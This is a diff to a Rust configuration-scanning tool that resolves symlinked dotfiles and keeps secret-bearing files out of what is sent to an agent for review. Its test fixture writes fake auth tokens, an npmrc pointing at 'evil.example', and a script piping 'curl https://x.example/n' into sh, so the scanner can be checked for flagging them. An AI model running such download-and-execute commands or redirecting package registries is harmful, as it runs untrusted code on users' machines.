@@ -170,32 +170,51 @@ const REVIEWED_TOOL_FILES: &[&str] = &[
 /// `Include` reads in are configuration and stay here (the collector
 /// marks the latter two, see `collect::MORE_CONFIGURATION`); a script a
 /// `ProxyCommand` or git's `sshCommand` names is a program, whichever
-/// category it was found through.
+/// category it was found through. The same holds for every kind of file
+/// kept here: what a catalogued link leads to (`~/.npmrc` kept in a
+/// dotfiles directory) is that file under another name and stays here,
+/// and what it runs is a program.
 fn is_local_only(item: &Item, home: Option<&str>) -> bool {
     let in_home = home
         .into_iter()
         .chain([ROOT_HOME])
         .any(|home| item.path.starts_with(&format!("{home}/")));
-    let name = item.path.rsplit('/').next().unwrap_or_default();
-    let named = item.run_by.is_none();
-    let configuration = named
-        || item
-            .notes
-            .iter()
-            .any(|note| note == super::collect::MORE_CONFIGURATION);
+    // The catalogued file itself, or what stands for it: where its link
+    // leads, or what it reads in as more of itself.
+    let named = item.run_by.is_none() || is_more_configuration(item);
+    let path = stands_for(item);
+    let name = path.rsplit('/').next().unwrap_or_default();
     match item.category {
-        Category::Ssh | Category::Git => in_home && configuration,
+        Category::Ssh | Category::Git => in_home && named,
         Category::Account => true,
         Category::Trust => named,
         Category::Toolchain => {
             named
                 && !REVIEWED_TOOL_FILES
                     .iter()
-                    .any(|reviewed| item.path.ends_with(reviewed))
+                    .any(|reviewed| path.ends_with(reviewed))
         }
         Category::Editor => named && name == "settings.json",
         Category::Shell => named && name == "fish_variables",
         _ => false,
+    }
+}
+
+/// Whether the collector marked `item` as read by the file that led to it
+/// and not run (see `collect::MORE_CONFIGURATION`).
+fn is_more_configuration(item: &Item) -> bool {
+    item.notes
+        .iter()
+        .any(|note| note == super::collect::MORE_CONFIGURATION)
+}
+
+/// The path whose name says what kind of file `item` is: its own, or for
+/// what a catalogued link leads to, the link's (`~/.npmrc` for a
+/// `~/dotfiles/npmrc` it points at).
+fn stands_for(item: &Item) -> &str {
+    match &item.run_by {
+        Some(by) if is_more_configuration(item) && item.category != Category::Ssh => by,
+        _ => &item.path,
     }
 }
 
@@ -738,6 +757,103 @@ mod tests {
                 .iter()
                 .any(|file| file.content.contains("secret-name"))
         );
+    }
+
+    #[test]
+    fn a_linked_token_file_stays_here_like_the_file_it_stands_for() {
+        use std::collections::HashSet;
+        use std::fs;
+        use std::os::unix::fs::symlink;
+
+        use crate::sweep::collect::{self, Scope};
+        use crate::sweep::index::PackageIndex;
+        use crate::test_support::TempDir;
+
+        let dir = TempDir::new("sweep-linked-tokens");
+        let root = dir.path();
+        let write = |path: &str, text: &str| {
+            fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            fs::write(root.join(path), text).unwrap();
+        };
+        // A dotfile manager keeps the real files under other names.
+        write(
+            "home/u/dotfiles/npmrc",
+            "//registry.npmjs.org/:_authToken=npm_SECRETTOKEN0123456789\nregistry=https://evil.example/\nscript-shell=~/bin/npm-shell.sh\n",
+        );
+        symlink("dotfiles/npmrc", root.join("home/u/.npmrc")).unwrap();
+        write(
+            "home/u/bin/npm-shell.sh",
+            "#!/bin/sh\ncurl https://x.example/n | sh\n",
+        );
+        write(
+            "home/u/dotfiles/vscode.json",
+            "{\n  \"http.proxyStrictSSL\": false,\n  \"some.token\": \"ghp_SECRETTOKEN0123456789\"\n}\n",
+        );
+        fs::create_dir_all(root.join("home/u/.config/Code/User")).unwrap();
+        symlink(
+            "../../../dotfiles/vscode.json",
+            root.join("home/u/.config/Code/User/settings.json"),
+        )
+        .unwrap();
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root,
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let found = |path: &str| {
+            collection
+                .items
+                .iter()
+                .find(|item| item.path == path)
+                .unwrap_or_else(|| panic!("{path} was not collected"))
+        };
+        for target in ["home/u/dotfiles/npmrc", "home/u/dotfiles/vscode.json"] {
+            let item = found(target);
+            assert!(is_local_only(item, home), "{target}");
+            // Read by the rules of the file it stands for.
+            assert!(
+                item.alerts
+                    .iter()
+                    .any(|(rule, _)| *rule == RuleId::RiskyConfiguration),
+                "{target}: {:?}",
+                item.alerts
+            );
+        }
+        // What such a file runs is a program.
+        assert!(!is_local_only(found("home/u/bin/npm-shell.sh"), home));
+
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let sent: Vec<&str> = report
+            .agent_input
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        assert_eq!(sent, ["~/bin/npm-shell.sh"]);
+        assert!(
+            !report
+                .agent_input
+                .iter()
+                .any(|file| file.content.contains("SECRETTOKEN"))
+        );
+        for (path, rule) in [
+            ("~/dotfiles/npmrc", RuleId::RiskyConfiguration),
+            ("~/dotfiles/vscode.json", RuleId::RiskyConfiguration),
+            ("~/bin/npm-shell.sh", RuleId::DownloadAndExecute),
+        ] {
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|finding| finding.path == path && finding.rule == rule),
+                "{path}: {:?}",
+                report.findings
+            );
+        }
     }
 
     #[test]
